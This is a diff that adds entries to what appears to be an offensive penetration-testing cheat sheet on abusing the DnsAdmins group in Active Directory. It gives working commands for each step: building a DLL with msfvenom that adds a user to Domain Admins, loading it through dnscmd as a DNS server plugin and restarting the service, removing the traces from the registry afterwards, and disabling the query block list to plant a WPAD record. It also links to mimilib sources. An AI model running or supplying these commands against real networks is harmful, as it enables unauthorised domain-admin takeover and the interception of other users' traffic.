@@ -2544,6 +2544,36 @@ C:\> wevtutil qe Security /rd:true /f:text /r:<remote PC> /u:<username> /p:<pass
 PS C:\> Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*' } | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
 ```
 
+- DnsAdmins
+
+```
+$ msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
+C:\> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
+C:\> sc.exe sdshow DNS
+C:\> sc stop dns
+C:\> sc start dns
+C:\> net group "Domain Admins" /dom
+C:\> reg query \\<IP address>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
+C:\> reg delete \\<IP address>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll
+C:\> sc.exe start dns
+C:\> sc.exe query dns
+```
+
+- DnsAdmins (Mimilib.dll)
+
+```
+https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html
+https://github.com/gentilkiwi/mimikatz/tree/master/mimilib
+https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c
+```
+
+- DnsAdmins (WPAD)
+
+```
+PS C:\> Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName <hostname>
+PS C:\> Add-DnsServerResourceRecordA -Name wpad -ZoneName <domain> -ComputerName <hostname> -IPv4Address <IP address>
+```
+
 #6. - Persistence
 -----------------------------------------
 
